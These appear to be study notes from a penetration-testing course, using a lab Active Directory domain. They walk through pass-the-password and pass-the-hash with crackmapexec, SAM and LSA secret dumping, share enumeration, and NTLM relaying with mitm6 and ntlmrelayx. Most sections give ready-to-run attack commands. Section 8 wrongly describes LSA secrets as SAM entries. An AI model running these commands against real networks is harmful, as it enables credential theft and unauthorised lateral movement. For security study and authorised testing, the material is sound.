# 📋 **Summary**

This guide covers **pass-the-attack techniques** to facilitate **lateral movement** within a network using captured passwords and hashes. **Pass-the-Password** and **Pass-the-Hash** attacks allow you to authenticate and access other machines without needing the plaintext password. Additionally, **SAM hash dumping** provides a way to gather credentials from compromised machines. By using tools like `crackmapexec`, `mitm6`, `ntlmrelayx.py`, and `Responder`, you can capture credentials, relay them to target machines, and expand control within a network. These attacks help identify which machines can be accessed with reused credentials, providing the foundation for further exploitation.

---

## 📜 **Detailed Notes**

### **1. Pass Attacks Overview**

- **Pass Attacks**: Use **another user's credentials** (passwords or hashes) to access machines on the network.
    - **Pass-the-Password**: Utilizes a cracked plaintext password to log in to other machines.
    - **Pass-the-Hash**: Uses an NTLM hash instead of the password to gain access.

**Why Are We Doing This?**:

- To test if **captured passwords or hashes** can be reused on other network machines for **lateral movement**.
- Expand our control by finding other systems that accept these credentials.

### **2. Pass-the-Password Attack**

**Objective**: Reuse a cracked password to access other machines.

- **Command**:
    
    ```bash
    crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
    
    ```
    
    - `<ip/CIDR>`: The network range to target (e.g., `192.168.164.0/24`).
    - `<user>`: Username (e.g., `fcastle`).
    - `<domain>`: Domain (e.g., `MARVEL.local`).
    - `<password>`: Cracked password (e.g., `Password1`).

**Example**:

```bash
crackmapexec smb 192.168.164.0/24 -u fcastle -d MARVEL.local -p Password1

```

- This command tests the provided password across all machines in the specified network.

**Output Explanation**:

- **"Pwn3d!"**: Indicates successful login to a machine using the password.

### **3. Pass-the-Hash Attack**

**Objective**: Use an **NTLM hash** to authenticate without knowing the password.

- **Command**:
    
    ```bash
    crackmapexec smb <ip/CIDR> -u administrator -H <hash> --local-auth
    
    ```
    
    - `H`: The NTLM hash (e.g., `aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b`).
    - `-local-auth`: Attempts to authenticate using the local account on each machine.

**Example**:

```bash
crackmapexec smb 192.168.138.0/24 -u administrator -H [hash] --local-auth

```

- Tests the hash on every machine within the network range.

**Output Explanation**:

- **"Pwn3d!"**: Successfully authenticated using the hash, granting administrative access.
- **"STATUS_LOGON_FAILURE"**: Indicates failed authentication.

**💡 Key Point**: Even if the hash can't be cracked, it can still be **passed around** to gain access to machines.

### **4. SAM Hash Dumping**

**Objective**: Extract password hashes from a compromised machine to use in further attacks.

- **Commands**:
    
    ```bash
    crackmapexec smb <ip/CIDR> -u administrator -H [hash] --local-auth --sam
    
    ```
    
    - This command dumps the **SAM hashes** (stored user credentials) from the target machine.

**Output Explanation**:

- Displays **usernames** and **hashed passwords**.
- Saves dumped hashes to a database for later use.

### **5. Enumerating Shares**

- Use `crackmapexec` to list **network shares** on a target machine:
    
    ```bash
    crackmapexec smb <ip/CIDR> -u administrator -H [hash] --local-auth --shares
    
    ```
    
    - This command reveals the shared folders on the compromised machine, potentially exposing sensitive files.

### **6. Network Sweeping and Using `cmedb` for Credential Tracking**

- **Network Sweep**:
    
    ```bash
    crackmapexec smb 192.168.138.0/24 -u administrator -H [hash] --local-auth
    
    ```
    
    - Sweeps the network to see where the credentials are valid.
- **Using `cmedb`**:
    - **`cmedb`**: A database to keep track of tested hosts and credentials. Use it to review which credentials have successfully authenticated to which hosts.

### **7. MITM Attacks: Using `mitm6` and `Responder`**

- **`mitm6`**: Launches an IPv6 MITM attack to capture NTLM authentication requests.
- **`Responder`**: Poisons LLMNR and NBT-NS requests to capture NTLM hashes.
- **Flow**:
    1. **Run `mitm6`**:
        
        ```bash
        sudo mitm6 -d marvel.local
        
        ```
        
        - Spoofs a network resource to trick machines into sending NTLM authentication.
    2. **Reboot the target machine**: Forces the target to reinitiate network discovery, sending out NTLM traffic.
    3. **Relay Authentication**:
        
        ```bash
        ntlmrelayx.py -6 -t ldaps://192.168.164.138 -wh fakewpad.marvel.local -l lootme
        
        ```
        
        - Captures and relays the NTLM authentication to the domain controller.
    4. **Store Results**: The **lootme** folder stores captured credentials and other data for post-exploitation.

### **8. Using `lsa` with `crackmapexec`**

**Objective**: Retrieve a list of Security Accounts Manager (SAM) database entries, including passwords, stored on the target machine's Local Security Authority (LSA) Secrets. This command is essential for gathering **credentials** stored in Windows memory, which can provide access to further systems in the network.

**Command**:

```bash
crackmapexec smb <ip/CIDR> -u administrator -H [hash] --local-auth -lsa

```

- **`lsa`**: This flag instructs `crackmapexec` to query the **Local Security Authority (LSA)** on the target machine to dump stored secrets, such as user credentials, domain information, and cached passwords. This information can be leveraged to escalate privileges or move laterally across the network.

**Output Explanation**:

- Lists **sensitive information** such as cached credentials, stored passwords, and other authentication data stored by Windows.
- Useful in identifying accounts and credentials that can be used for further penetration and lateral movement.

**💡 Key Point**: LSA secrets often contain **plaintext passwords** or other valuable information, making this command critical for post-exploitation and network domination.

---

## 🔍 **Abbreviations & Definitions**

- **SMB (Server Message Block)**: Protocol for file sharing over a network.
- **NTLM (NT LAN Manager)**: Microsoft's suite of security protocols for user authentication.
- **LLMNR (Link-Local Multicast Name Resolution)**: Used for name resolution on local networks.
- **NBT-NS (NetBIOS Name Service)**: Legacy protocol for name resolution.
- **Pass-the-Hash**: Authentication using a hashed version of a password.
- **Pass-the-Password**: Using a plaintext password to authenticate.
- **SAM (Security Account Manager)**: Database storing user credentials on Windows systems.
- **MITM (Man-In-The-Middle)**: Attacker intercepts communication between network devices.
- **`mitm6`**: Tool for IPv6-based MITM attacks to capture NTLM authentication.
- **`Responder`**: Tool for LLMNR/NBT-NS poisoning to capture NTLM hashes.
- **`-local-auth`**: Tells `crackmapexec` to use local user accounts on the target machines.

---

## 🚨 **Critical Mentions & Exam Traps**

- **🚨 "Pwn3d!"**: Confirms successful access to a machine. If you see this, you have control over the target.
- **🚨 `-local-auth`**: Critical for targeting local user accounts instead of domain accounts.
- **🚨 IPv6 and Network Discovery**: When using `mitm6`, make sure IPv6 is enabled; rebooting the target initiates network discovery and sends NTLM traffic.
- **💡 Password and Hash Reuse**: You don’t need to crack a hash to use it—simply **pass it around** to find where it’s accepted.
- **💡 Use `cmedb`**: Track credentials that worked on different hosts to maintain an overview of your access.
- **💡 Loot Folder**: Always check the **loot folder** (`lootme`) for stored credentials and information after relaying attacks.

---